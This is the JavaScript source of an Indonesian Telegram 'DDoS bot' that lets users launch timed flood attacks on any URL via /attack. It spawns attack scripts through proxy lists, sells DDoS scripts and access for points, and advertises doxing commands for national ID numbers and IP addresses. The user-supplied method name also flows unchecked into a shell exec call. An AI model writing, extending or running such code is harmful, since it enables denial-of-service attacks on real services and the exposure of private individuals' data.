const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const fetch = (...args) => import("node-fetch").then(({ default: fetch }) => fetch(...args));
const path = require('path');
const axios = require('axios');
const os = require('os');
const dns = require("dns").promises;
const readline = require('readline');
const { nikParser } = require('nik-parser');
const AdmZip = require("adm-zip");
const https = require("https");
const FormData = require("form-data");
const cheerio = require("cheerio");
const archiver = require("archiver");
const JsConfuser = require("js-confuser");
const url = require('url');
const net = require('net');
const unzipper = require("unzipper");
const { exec } = require('child_process');
const { PassThrough } = require('stream');
const { sampah, log } = require('./lib/cache/http.js');
const SplitFile = require('split-file');
const UserAgent = require('user-agents');
const config = require("./config.js");

const BOT_NAME = config.BOT_NAME;
const TELEGRAM_TOKEN = config.TELEGRAM_TOKEN;
const OWNER_ID = config.OWNER_ID;

const INDEX_PATH = path.join(__dirname, "index.js");

// === Bot Initialization ===
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

module.exports = { bot };

function createProgressBar(completed, total, len = 10) {
  if (total <= 0) total = 1;
  const perc = completed / total;
  const filled = Math.round(perc * len);
  const empty = len - filled;
  return '█'.repeat(filled) + '▒'.repeat(empty) + ` ${Math.round(perc * 100)}%`;
}

// ================== PROXY & UA AUTOCREATE ==================
const PROXY_FILE = 'proxy.txt';
const UA_FILE = 'ua.txt';

async function fetchWithTimeout(urlToFetch, timeout = 10000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeout);
  try {
    const res = await fetch(urlToFetch, { signal: controller.signal });
    clearTimeout(timer);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return await res.text();
  } catch (err) {
    clearTimeout(timer);
    throw err;
  }
}

async function writeSafeFile(filePath, data) {
  try {
    await fs.promises.writeFile(filePath, data, 'utf8');
  } catch {
    await fs.promises.writeFile(filePath, '', 'utf8');
  }
}

async function scrapeProxy(retries = 2) {
  for (let i = 0; i <= retries; i++) {
    try {
      const data = await fetchWithTimeout(sampah, 10000);
      if (!data.trim()) throw new Error('Empty content');
      await writeSafeFile(PROXY_FILE, data);
      return true;
    } catch {
      if (i === retries) {
        await writeSafeFile(PROXY_FILE, '');
        return false;
      }
      await new Promise(r => setTimeout(r, 1500));
    }
  }
}

async function scrapeUserAgent(retries = 2) {
  for (let i = 0; i <= retries; i++) {
    try {
      const data = await fetchWithTimeout(log, 10000);
      if (!data.trim()) throw new Error('Empty content');
      await writeSafeFile(UA_FILE, data);
      return true;
    } catch {
      if (i === retries) {
        await writeSafeFile(UA_FILE, '');
        return false;
      }
      await new Promise(r => setTimeout(r, 1500));
    }
  }
}

async function initResources() {
  await Promise.allSettled([scrapeProxy(), scrapeUserAgent()]);
  if (!fs.existsSync(PROXY_FILE)) await writeSafeFile(PROXY_FILE, '');
  if (!fs.existsSync(UA_FILE)) await writeSafeFile(UA_FILE, '');
}

(async () => {
  await initResources();
})();

const ongoingAttacks = [];

// ==================== PUSH ONGOING ====================
function pushOngoing(target, method, durationSeconds, stopFn = null) {
  if (!target || !method) throw new Error("Invalid args to pushOngoing");
  const duration = Number(durationSeconds);
  if (Number.isNaN(duration) || duration <= 0) throw new Error("Duration must be positive");

  const key = `${target}|${method}`;
  if (ongoingAttacks.some(o => o.key === key)) throw new Error("Attack already ongoing for this target+method");

  const startTs = Date.now();
  const endsAt = startTs + duration * 1000;

  const item = {
    key,
    target,
    method,
    duration,
    startTs,
    endsAt,
    stopFn,
    timeoutId: null
  };

  // Auto-stop & cleanup tepat saat durasi habis (+100ms buffer)
  item.timeoutId = setTimeout(() => {
    const idx = ongoingAttacks.findIndex(o => o.key === key);
    if (idx !== -1) {
      try { if (typeof ongoingAttacks[idx].stopFn === "function") ongoingAttacks[idx].stopFn(); } catch (e) {}
      ongoingAttacks.splice(idx, 1);
      console.log(`🕒 Attack ${key} stopped automatically after ${duration}s`);
    }
  }, duration * 1000 + 100);

  ongoingAttacks.push(item);
  console.log(`🚀 Attack started: ${key} for ${duration}s`);
  return item;
}

function listOngoing() {
  return ongoingAttacks.map(o => ({
    target: o.target,
    method: o.method,
    duration: o.duration,
    started: new Date(o.startTs).toISOString(),
    endsAt: new Date(o.endsAt).toISOString()
  }));
}

// ==================== RUN ATTACK ====================
async function runAttack(botInstance, chatId, target, method, duration) {
  const metodePath = path.join(__dirname, `/lib/cache/${method}`);
  const args = [metodePath, target, duration, "100", "100", "proxy.txt"];

  const child = exec("node " + args.map(a => `"${a}"`).join(' '), { stdio: "ignore", detached: true });

  // stopFn untuk durasi tepat waktu
  const stopFn = () => {
    try {
      process.kill(-child.pid, "SIGTERM");
    } catch (e) {
      try { child.kill("SIGTERM"); } catch (_) {}
    }
    setTimeout(() => {
      try { process.kill(-child.pid, "SIGKILL"); } catch (e) {
        try { child.kill("SIGKILL"); } catch (_) {}
      }
    }, 500);
  };

  const item = pushOngoing(target, method, duration, stopFn);

  // Durasi habis → stop otomatis lewat pushOngoing
  child.on("exit", (code, signal) => {
    const idx = ongoingAttacks.findIndex(o => o.key === item.key);
    if (idx !== -1) {
      clearTimeout(ongoingAttacks[idx].timeoutId);
      ongoingAttacks.splice(idx, 1);
    }
    console.log(`Child exited pid=${child.pid} code=${code} signal=${signal}`);
  });

  // Pesan mulai
  const endAt = new Date(item.endsAt).toLocaleTimeString();
  try {
    await botInstance.sendMessage(
      chatId,
      `✅ Serangan ke <b>${target}</b> dimulai (${method}) selama ${duration} detik.\n🕒 Selesai pada: ${endAt}`,
      { parse_mode: "HTML" }
    );
  } catch (e) {}

  // Pesan selesai tepat waktu
  setTimeout(async () => {
    try {
      await botInstance.sendMessage(
        chatId,
        `✅ Serangan ke <b>${target}</b> selesai setelah ${duration} detik.`,
        { parse_mode: "HTML" }
      );
    } catch (_) {}
  }, duration * 1000 + 200);
}

const CHANNEL_USERNAME = config.CHANNEL_USERNAME;
const CHANNEL_ID = config.CHANNEL_ID;
const CHANNEL_LINK = config.CHANNEL_LINK;
const POINTS_FILE = './database/poin.json';
const REF_FILE = './database/referrals.json';
const CLICK_FILE = './database/clicks.json';
const CHANNEL_FILE = './database/channel.json';

[POINTS_FILE, REF_FILE, CLICK_FILE, CHANNEL_FILE].forEach(file => {
  if (!fs.existsSync(file)) fs.writeFileSync(file, '{}', 'utf8');
});

function loadJSON(path) {
  try { return JSON.parse(fs.readFileSync(path, 'utf8') || '{}'); } catch { return {}; }
}
function saveJSON(path, data) { fs.writeFileSync(path, JSON.stringify(data, null, 2), 'utf8'); }

function getPoints(id) {
  const data = loadJSON(POINTS_FILE);
  return data[id] || 0;
}
function setPoints(id, val) {
  const data = loadJSON(POINTS_FILE);
  data[id] = val;
  saveJSON(POINTS_FILE, data);
}
function incrementPoints(id, by = 2) {
  const data = loadJSON(POINTS_FILE);
  data[id] = (data[id] || 0) + by;
  saveJSON(POINTS_FILE, data);
  return data[id];
}
function resetPoints(id) {
  const data = loadJSON(POINTS_FILE);
  if (data[id]) {
    data[id] = 0;
    saveJSON(POINTS_FILE, data);
  }
}
function consumePoint(id, amount) {
  const data = loadJSON(POINTS_FILE);
  const current = data[id] || 0;
  if (current < amount) return false;
  data[id] = current - amount;
  saveJSON(POINTS_FILE, data);
  return true;
}
function getTotalUsers() {
  const data = loadJSON(POINTS_FILE);
  return Object.keys(data).length;
}

function setReferral(userId, refId) {
  const data = loadJSON(REF_FILE);
  data[userId] = refId;
  saveJSON(REF_FILE, data);
}
function hasReferral(userId) {
  const data = loadJSON(REF_FILE);
  return !!data[userId];
}

function hasClicked(refId, userId) {
  const data = loadJSON(CLICK_FILE);
  if (!data[refId]) data[refId] = [];
  return data[refId].includes(userId);
}
function recordClick(refId, userId) {
  const data = loadJSON(CLICK_FILE);
  if (!data[refId]) data[refId] = [];
  if (!data[refId].includes(userId)) data[refId].push(userId);
  saveJSON(CLICK_FILE, data);
}

function loadChannelData() { return loadJSON(CHANNEL_FILE); }
function saveChannelData(data) { saveJSON(CHANNEL_FILE, data); }
function hasJoinedBefore(userId) { return !!loadChannelData()[userId]; }
function markAsJoined(userId) {
  const data = loadChannelData();
  if (!data[userId]) {
    data[userId] = true;
    saveChannelData(data);
  }
}
async function resolveChannelId() {
  try {
    if (CHANNEL_ID) return CHANNEL_ID;
    if (!CHANNEL_USERNAME) return null;

    if (CHANNEL_USERNAME.startsWith("+")) {
      const joined = await bot.joinChatInviteLink(`https://t.me/${CHANNEL_USERNAME}`).catch(() => null);
      if (joined && joined.id) return joined.id;
      const chat = await bot.getChat(`https://t.me/${CHANNEL_USERNAME}`).catch(() => null);
      if (chat && chat.id) return chat.id;
      return null;
    }

    const chat = await bot.getChat(`@${CHANNEL_USERNAME}`).catch(() => null);
    if (chat && chat.id) return chat.id;

    return null;
  } catch {
    return null;
  }
}

async function isUserInChannel(userId) {
  try {
    const chId = await resolveChannelId();
    if (!chId) return false;
    const member = await bot.getChatMember(chId, userId).catch(() => null);
    if (!member) return false;
    return ['member', 'administrator', 'creator'].includes(member.status);
  } catch {
    return false;
  }
}
async function autoResetAndBanIfLeft(userId) {
  try {
    const pernahJoin = hasJoinedBefore(userId);
    if (!pernahJoin) return;

    const joinedCh = await isUserInChannel(userId);
    const points = getPoints(userId);

    if (!joinedCh) {
      if (points > 0) resetPoints(userId);
      try {
        await bot.banChatMember(CHANNEL_ID, userId);
        console.log(`🚫 User ${userId} keluar dari channel — poin direset & diban.`);
      } catch (err) {
        console.log(`❌ Gagal ban user ${userId} dari channel:`, err.message);
      }
    }
  } catch (err) {
    console.error(`⚠️ Gagal memeriksa status user ${userId}:`, err.message);
  }
}

function sanitizeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function asHtmlBlockFromPlain(captionPlain) {
  const safeHtml = sanitizeHtml(captionPlain);
  return `<blockquote><pre>${safeHtml}</pre></blockquote>`;
}

const asIdString = (id) => String(id);

bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = asIdString(msg.from.id);
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
  const startParam = match && match[1] ? match[1].trim() : null;

  await autoResetAndBanIfLeft(userId);

  if (startParam) {
    const refId = startParam.replace(/^ref_/, "");
    if (refId && refId !== userId) {
      if (!hasClicked(refId, userId)) {
        recordClick(refId, userId);
        incrementPoints(refId, 2);
        try {
          await bot.sendMessage(
            refId,
            `🎉 Seseorang menggunakan tautanmu!\nKamu mendapat *2 poin* (Total: ${getPoints(refId)})`,
            { parse_mode: "Markdown" }
          );
        } catch {}
      }
      if (!hasReferral(userId)) setReferral(userId, refId);
    }
  }

  const joinedCh = await isUserInChannel(userId);

  if (!joinedCh) {
    await bot.sendMessage(
      chatId,
      `🚫 *Access Denied!*\n\nKamu harus join *channel* terlebih dahulu untuk menggunakan bot ini.`,
      {
        parse_mode: "Markdown",
        disable_web_page_preview: true,
        reply_markup: {
          inline_keyboard: [
            [{ text: "✅ Sudah Join", callback_data: "cek_join" }],
            [{ text: "📢 Join Channel", url: `https://t.me/${CHANNEL_USERNAME}` }],
          ],
        },
      }
    );
    return;
  }

  if (!hasJoinedBefore(userId)) {
    incrementPoints(userId, 2);
    markAsJoined(userId);
  }

  const totalUsers = getTotalUsers();
  const caption = `⚰️ HELP ME

( 🕊️ ) - こんにちは ${username}👋🏻

🦋 Information:
⌬ Developer : @wan_host
⌬ Version : 3.0 
⌬ Total Pengguna : ${totalUsers}
⌬ Poin Anda : ${getPoints(userId)}

🔗 Link Referral!
https://t.me/${BOT_NAME}?start=ref_${userId}

⚠️ DISCLAIMER! 
Developer tidak bertanggung jawab atas segala tindakan pengguna.
`;

  const buttons = [
    [
      { text: "Attack Menu", callback_data: "command_menu" },
      { text: "Buy Akses", callback_data: "buy_poin" },
    ],
    [
      { text: "Owner Menu", callback_data: "owner_menu" },
      { text: "Tools Menu", callback_data: "tools_menu" },
    ],
    [{ text: "Developer", url: "https://t.me/WAN_HOST" }],
  ];

  await bot.sendVideo(chatId, "https://files.catbox.moe/7a2q92.mp4", {
    caption: asHtmlBlockFromPlain(caption),
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: buttons },
  });
});

// ====== CALLBACK HANDLER ======
bot.on("callback_query", async (query) => {
  const { from, data, message } = query;
  const chatId = message.chat.id;
  const userId = asIdString(from.id);

  if (data === "cek_join") {
    const joinedCh = await isUserInChannel(userId);

    if (!joinedCh) {
      resetPoints(userId);
      await bot.answerCallbackQuery(query.id, {
        text: "❌ Kamu belum join channel!",
        show_alert: true,
      });
      return;
    } else {
      await bot.answerCallbackQuery(query.id, {
        text: "✅ Sudah join channel!",
        show_alert: true,
      });
      if (!hasJoinedBefore(userId)) {
        incrementPoints(userId, 2);
        markAsJoined(userId);
      }
    }
  }

  // === MENU BELI POIN ===
  if (data === "buy_poin") {
    const buyCaption = `💰 LIST HARGA AKSES

25k  : Sc ddos no enc
15k :  Sc ddos enc free up
10k  : akses VIP 
5k : 500 poin
`;
    await bot.editMessageCaption(asHtmlBlockFromPlain(buyCaption), {
      chat_id: chatId,
      message_id: message.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⬅️ Kembali", callback_data: "back_to_menu" }],
          [{ text: "👤 Developer", url: "https://t.me/WAN_HOST" }],
        ],
      },
    });
  }

  if (data === "tools_menu") {
    const cmdCaption = `👾 T O O L S - M E N U

=> 𝘔𝘌𝘕𝘜 𝘛𝘖𝘖𝘓𝘚 <=
/redeem <kode>
/doxnik <nik>
/doxip <ip>
/brat <teks>
/iqc 
/poin
`;
    await bot.editMessageCaption(asHtmlBlockFromPlain(cmdCaption), {
      chat_id: chatId,
      message_id: message.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "⬅️ Kembali", callback_data: "back_to_menu" }]],
      },
    });
  }
  // === COMMAND MENU ===
  if (data === "command_menu") {
    const cmdCaption = `👾 A T T A C K - M E N U

=> 𝘔𝘌𝘕𝘜 𝘈𝘛𝘛𝘈𝘊𝘒 <=
/attack <link> 77777 flood
/ddos <link> flood
/ping <link>
/methods
`;
    await bot.editMessageCaption(asHtmlBlockFromPlain(cmdCaption), {
      chat_id: chatId,
      message_id: message.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "⬅️ Kembali", callback_data: "back_to_menu" }]],
      },
    });
  }

  // === OWNER MENU ===
  if (data === "owner_menu") {
    if (userId !== OWNER_ID) {
      await bot.answerCallbackQuery(query.id, {
        text: "🚫 Hanya Owner yang bisa membuka menu ini!",
        show_alert: true,
      });
      return;
    }

    const ownerCaption = `👾 O W N E R - M E N U

=> 𝘔𝘌𝘕𝘜 𝘖𝘞𝘕𝘌𝘙 <=
/addpoin <id> <jumlah>
/delpoin <id>
/listpoin
/addres <id>
/delres <id>

/addvip <id>
/delvip <id>
/addkode <kode>
/bedrocarct <reply>
/backup
/restart
`;
    await bot.editMessageCaption(asHtmlBlockFromPlain(ownerCaption), {
      chat_id: chatId,
      message_id: message.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⬅️ Kembali", callback_data: "back_to_menu" }],
          [{ text: "Developer", url: "https://t.me/WAN_HOST" }],
        ],
      },
    });
  }

  // === KEMBALI KE MENU UTAMA ===
  if (data === "back_to_menu") {
    const points = getPoints(userId);
    const totalUsers = getTotalUsers();
    const username = from.username ? `@${from.username}` : from.first_name;

    const mainCaption = `⚰️ HELP ME

( 🕊️ ) - こんにちは ${username}👋🏻

🦋 Information:
⌬ Developer : @wan_host
⌬ Version : 3.0
⌬ Total Pengguna : ${totalUsers}
⌬ Poin Anda : ${getPoints(userId)}

🔗 Link Referral!
https://t.me/${BOT_NAME}?start=ref_${userId}

⚠️ DISCLAIMER! 
Developer tidak bertanggung jawab atas segala tindakan pengguna.
`;

    const buttons = [
    [
      { text: "Attack Menu", callback_data: "command_menu" },
      { text: "Buy Akses", callback_data: "buy_poin" },
    ],
    [
      { text: "Owner Menu", callback_data: "owner_menu" },
      { text: "Tools Menu", callback_data: "tools_menu" },
    ],
    [{ text: "Developer", url: "https://t.me/WAN_HOST" }],
  ];

    await bot.editMessageCaption(asHtmlBlockFromPlain(mainCaption), {
      chat_id: chatId,
      message_id: message.message_id,
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: buttons },
    });
  }
});
bot.onText(/^\/restart$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();

  if (userId !== OWNER_ID) {
    return bot.sendMessage(chatId, '❌ Anda bukan owner!');
  }

  try {
    let sentMessage = await bot.sendMessage(
      chatId,
      `<b>♻️ Sedang me-restart bot...</b>\n<pre>${createProgressBar(0)} 0%</pre>`,
      { parse_mode: 'HTML' }
    );

    console.log(`[${new Date().toLocaleTimeString()}] Restart diminta oleh Owner (${userId})`);

    let percentage = 0;
    const interval = setInterval(async () => {
      percentage += 20;

      if (percentage >= 100) {
        clearInterval(interval);
        await bot.editMessageText(
          `✅ <b>Bot berhasil direstart!</b>\n<pre>${createProgressBar(100)} 100%</pre>`,
          {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: 'HTML'
          }
        );

        setTimeout(() => process.exit(1), 1200); // restart otomatis
      } else {
        await bot.editMessageText(
          `<b>♻️ Sedang me-restart bot...</b>\n<pre>${createProgressBar(percentage)} ${percentage}%</pre>`,
          {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: 'HTML'
          }
        );
      }
    }, 800);
  } catch (err) {
    console.error('❌ Gagal restart:', err);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mencoba restart bot.');
  }
});
function randomFileName(ext) {
  return path.join(__dirname, `${Date.now()}_${Math.random().toString(36).slice(2)}.${ext}`);
}

// Helper: Ekstrak JS dan CSS URL dari HTML
function extractResourceUrls(html, baseUrl) {
  const jsRegex = /<script[^>]+src=["']([^"']+)["']/gi;
  const cssRegex = /<link[^>]+href=["']([^"']+)["'][^>]*rel=["']stylesheet["']/gi;

  const urls = { js: [], css: [] };
  let match;

  while ((match = jsRegex.exec(html))) urls.js.push(new URL(match[1], baseUrl).href);
  while ((match = cssRegex.exec(html))) urls.css.push(new URL(match[1], baseUrl).href);

  return urls;
}

bot.onText(/\/gethtml (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1].trim();

  try {
    const progressMsg = await bot.sendMessage(
      chatId,
      "```Sedang diproses!\n▱▱▱▱▱▱▱▱▱▱ 0%```",
      { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' }
    );

    const updateProgress = async (percent) => {
      await bot.editMessageText(
        `\`\`\`\nSedang diproses!\n${createProgressBar(percent)} ${percent}%\`\`\``,
        {
          chat_id: chatId,
          message_id: progressMsg.message_id,
          parse_mode: 'Markdown'
        }
      );
    };

    const { data: html } = await axios.get(url, { timeout: 15000 });
    await updateProgress(30);

    const { js, css } = extractResourceUrls(html, url);
    const zip = new AdmZip();

    zip.addFile('index.html', Buffer.from(html, 'utf-8'));
    await updateProgress(50);

    for (const cssUrl of css) {
      try {
        const { data: cssData } = await axios.get(cssUrl, { timeout: 10000 });
        const fileName = 'css/' + path.basename(new URL(cssUrl).pathname);
        zip.addFile(fileName, Buffer.from(cssData, 'utf-8'));
      } catch {
        console.warn('Gagal ambil CSS:', cssUrl);
      }
    }
    await updateProgress(70);

    for (const jsUrl of js) {
      try {
        const { data: jsData } = await axios.get(jsUrl, { timeout: 10000 });
        const fileName = 'js/' + path.basename(new URL(jsUrl).pathname);
        zip.addFile(fileName, Buffer.from(jsData, 'utf-8'));
      } catch {
        console.warn('Gagal ambil JS:', jsUrl);
      }
    }
    await updateProgress(90);

    const zipPath = randomFileName('zip');
    zip.writeZip(zipPath);
    await updateProgress(100);

    await bot.sendDocument(chatId, zipPath, {
      caption: `📦 Semua kode HTML, CSS, dan JS dari:\n${url}`,
    });

    fs.unlinkSync(zipPath);
  } catch (err) {
    console.error('Error ambil kode:', err.message);
    bot.sendMessage(chatId, '⚠️ Gagal mengambil file dari link. Pastikan link valid & dapat diakses.');
  }
});
bot.onText(/^(?:\/|\.|)attack(?:@[\w_]+)?\s*$/i, async (msg) => {
  const chatId = msg.chat.id;
  try {
    await bot.sendMessage(chatId, '/attack <link> 77777 flood', { disable_web_page_preview: true });
  } catch (e) {
    console.log('sendMessage contoh /attack failed:', e.message);
  }
});
function wrapCodeBlock(text) {
  // jika ada ``` di text, sedikit amankan supaya tidak menutup blok kode secara prematur
  return '```' + text.replace(/```/g, '`' + String.fromCharCode(8203) + '``') + '```';
}

const COOLDOWNS_FILE = path.join(__dirname, 'database', 'cooldowns.json');
const COOLDOWN_MS = 10 * 60 * 1000;


async function ensureCooldownFile() {
  try {
    if (!fs.existsSync(COOLDOWNS_FILE)) {
      fs.writeFileSync(COOLDOWNS_FILE, JSON.stringify({ users: {}, nocd: {} }, null, 2), 'utf8');
    }
  } catch (e) {
    console.error('[ensureCooldownFile]', e);
  }
}

async function loadCooldowns() {
  await ensureCooldownFile();
  try {
    const raw = fs.readFileSync(COOLDOWNS_FILE, 'utf8') || '{}';
    const data = JSON.parse(raw);
    if (!data.users) data.users = {};
    if (!data.nocd) data.nocd = {};
    return data;
  } catch (e) {
    console.error('[loadCooldowns]', e);
    return { users: {}, nocd: {} };
  }
}

async function saveCooldowns(obj) {
  try {
    fs.writeFileSync(COOLDOWNS_FILE, JSON.stringify(obj, null, 2), 'utf8');
  } catch (e) {
    console.error('[saveCooldowns]', e);
  }
}

function formatDurationMs(ms) {
  if (ms <= 0) return '0 detik';
  let totalSec = Math.floor(ms / 1000);
  const days = Math.floor(totalSec / 86400);
  totalSec %= 86400;
  const hours = Math.floor(totalSec / 3600);
  totalSec %= 3600;
  const minutes = Math.floor(totalSec / 60);
  const seconds = totalSec % 60;
  const parts = [];
  if (days) parts.push(`${days} hari`);
  if (hours) parts.push(`${hours} jam`);
  if (minutes) parts.push(`${minutes} menit`);
  if (seconds) parts.push(`${seconds} detik`);
  return parts.join(' ');
}

bot.onText(/^\/nocd(?:@[\w_]+)?\s+(\d+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = String(msg.from.id);
  const targetId = String(match[1]);

  if (senderId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Hanya OWNER yang dapat menggunakan perintah ini.");
  }

  let data = await loadCooldowns();
  if (data.nocd[targetId]) {
    return bot.sendMessage(chatId, `ℹ️ User ID *${targetId}* sudah dalam mode NO COOLDOWN.`, { parse_mode: "Markdown" });
  }

  data.nocd[targetId] = true;
  await saveCooldowns(data);

  return bot.sendMessage(chatId, `✅ Mode *NO COOLDOWN* diaktifkan untuk user ID *${targetId}*. (Cooldown tidak berlaku)`, { parse_mode: "Markdown" });
});

bot.onText(/^\/oncd(?:@[\w_]+)?\s+(\d+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = String(msg.from.id);
  const targetId = String(match[1]);

  if (senderId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Hanya OWNER yang dapat menggunakan perintah ini.");
  }

  let data = await loadCooldowns();
  if (data.nocd[targetId]) {
    delete data.nocd[targetId];
    await saveCooldowns(data);
    return bot.sendMessage(chatId, `✅ Mode *NO COOLDOWN* dimatikan untuk user ID *${targetId}*. (Cooldown kembali berlaku)`, { parse_mode: "Markdown" });
  } else {
    return bot.sendMessage(chatId, `ℹ️ User ID *${targetId}* tidak sedang dalam mode NO COOLDOWN.`, { parse_mode: "Markdown" });
  }
});

bot.onText(/^(?:\/|\.|)attack(?:@[\w_]+)?\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const sender = String(msg.from.id);
  const penggunaName = msg.from.username ? `@${msg.from.username}` : `${msg.from.first_name || ''} ${msg.from.last_name || ''}`.trim() || sender;
  let data = await loadCooldowns();

  if (!data.nocd) data.nocd = {};
  if (!data.users) data.users = {};

  if (!data.nocd[sender]) {
    const lastUsed = data.users[sender] || 0;
    const now = Date.now();
    const timePassed = now - lastUsed;

    if (timePassed < COOLDOWN_MS) {
      const remaining = COOLDOWN_MS - timePassed;
      const remStr = formatDurationMs(remaining);
      try {
        await bot.sendMessage(chatId, `⏳ Maaf ${penggunaName}, fitur /attack masih cooldown.\nSilakan coba lagi dalam: *${remStr}*.`, { parse_mode: 'Markdown' });
      } catch (e) {}
      return;
    }
  }

  const userPoints = await getPoints(sender);
  if (userPoints <= 0) {
    const reply = '🚫 Bagikan tautan ini untuk mendapatkan 2 poin jika ada user yg tekan tautan kamu\n' +
      `https://t.me/${BOT_NAME}?start=ref_${sender}\n`;
    try { await bot.sendMessage(chatId, reply, { disable_web_page_preview: true }); } catch (e) {}
    return;
  }

  const argsRaw = (match && match[1]) ? match[1].trim() : '';
  const args = argsRaw ? argsRaw.split(/\s+/) : [];

  if (args.length < 3) {
    const usage = 'Contoh penggunaan:\n/attack <target> <duration> <methods>\nContoh:\n/attack https://google.com 120 flood';
    try { await bot.sendMessage(chatId, usage, { disable_web_page_preview: true }); } catch (e) {}
    return;
  }

  async function consumePoint(userId, amount = 1) {
    const points = await getPoints(userId);
    if (points >= amount) {
      await setPoints(userId, points - amount);
      return true;
    }
    return false;
  }

  const consumed = await consumePoint(sender, 1);
  if (!consumed) {
    try {
      await bot.sendMessage(chatId, '⚠️ Gagal menggunakan poin — sepertinya poin Anda sudah habis. Coba lagi setelah mengumpulkan poin.', { disable_web_page_preview: true });
    } catch (e) {}
    return;
  }

  // === Animasi progress ===
  function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

function renderBar(pct) {
  const total = 10; // panjang bar 10 blok
  const filled = Math.round((pct / 100) * total);
  const empty = total - filled;
  return `[${"█".repeat(filled)}${"░".repeat(empty)}] ${pct}%`;
}

const target = args[0];
const durationRaw = args[1];
const methods = args[2];
const duration = Number(durationRaw);

const progressMsg = await bot.sendMessage(
  chatId,
  `🔄 *Memproses...*\n\n\`\`\`\n${renderBar(0)}\n\`\`\`\n🎯 Target: ${target}`,
  { parse_mode: "Markdown" }
);

for (let pct = 5; pct <= 100; pct += 5) {
  await sleep(700);
  await bot.editMessageText(
    `🔄 *Memproses...*\n\n\`\`\`\n${renderBar(pct)}\n\`\`\`\n🎯 Target: ${target}`,
    {
      chat_id: chatId,
      message_id: progressMsg.message_id,
      parse_mode: "Markdown"
    }
  );
}

  const now = Date.now();
  try {
    data.users[sender] = now;
    await saveCooldowns(data);
  } catch (e) {}

  if (Number.isNaN(duration) || duration <= 0) {
    try { await bot.sendMessage(chatId, 'Duration must be a positive number (seconds).'); } catch (_) {}
    return;
  }

  function formatDuration(ms) {
    let totalSec = Math.max(0, Math.floor(ms / 1000));
    const days = Math.floor(totalSec / 86400);
    totalSec %= 86400;
    const hours = Math.floor(totalSec / 3600);
    totalSec %= 3600;
    const minutes = Math.floor(totalSec / 60);
    const parts = [];
    if (days) parts.push(`${days} hari`);
    if (hours) parts.push(`${hours} jam`);
    if (minutes) parts.push(`${minutes} menit`);
    return parts.join(' ') || '0 menit';
  }

  const endAt = Date.now() + duration * 1000;
  let endTimeStr = '-';
  try { endTimeStr = new Date(endAt).toLocaleString('id-ID', { timeZone: 'Asia/Makassar' }); } catch (e) { endTimeStr = new Date(endAt).toISOString(); }

  let hostname;
  try { hostname = new URL(target).hostname; } catch { hostname = target; }

  let result = {};
  try {
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    result = scrape.data || {};
  } catch {}

const out = `\`\`\`
✅ Proses Selesai

🎯 Target : ${target}
⏱️ Durasi : ${duration} detik
⚙️ Metode : ${methods}
🌐 ISP    : ${result.isp || '-'}
💻 IP     : ${result.query || '-'}
🏢 AS     : ${result.as || '-'}
📅 Selesai: ${endTimeStr}
\`\`\``;

const ownerMsg = `\`\`\`
🔔 Notifikasi Penggunaan Fitur /attack
Pengguna : ${penggunaName} (id: ${sender})
Target   : ${target}
Durasi   : ${duration} detik
Metode   : ${methods}
Selesai  : ${endTimeStr}
\`\`\``;

let ownerTargetUrl = target;
try {
  new URL(target);
} catch {
  ownerTargetUrl = `http://${target}`;
}

const ownerOpts = {
  parse_mode: 'Markdown',
  disable_web_page_preview: true,
  reply_markup: {
    inline_keyboard: [
      [{ text: 'Check Web', url: ownerTargetUrl }]
    ]
  }
};

try {
  await bot.sendMessage(OWNER_ID, ownerMsg, ownerOpts);
} catch (err) {
  console.log('notify OWNER_ID failed:', err.message);
}

const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(target)}`;
const opts = {
  reply_markup: {
    inline_keyboard: [
      [{ text: 'Cek Target', url: checkUrl }]
    ]
  }
};

try {
  await bot.sendMessage(chatId, out, {
    parse_mode: 'Markdown',
    reply_markup: opts.reply_markup,
    disable_web_page_preview: true
  });
} catch (err) {
  console.log('sendMessage failed:', err.message);
}

const metode = path.join(__dirname, `/lib/cache/${methods}`);

  // helper kecil untuk menjalankan exec dan menangani error + cleanup ongoingAttacks
  function runAttackCommand(cmd, onStartedMessage = 'Serangan Selesai.') {
    exec(cmd, (err, stdout, stderr) => {
      if (err) {
        console.log('Exec error:', err.message);
        try { bot.sendMessage(chatId, `Failed to start attack process: ${err.message}`); } catch (_) {}
        const key = `${target}|${methods}`;
        const idx = ongoingAttacks.findIndex(o => o.key === key);
        if (idx !== -1) ongoingAttacks.splice(idx, 1);
        return;
      }
      console.log('Serangan Selesai.');
      // kirim konfirmasi proses dimulai + tombol check
      const checkUrl2 = `https://check-host.net/check-http?host=${encodeURIComponent(target)}`;
      const opts2 = {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'check', url: checkUrl2 }]
          ]
        }
      };
      try { bot.sendMessage(chatId, onStartedMessage, opts2); } catch (_) {}
    });
  }

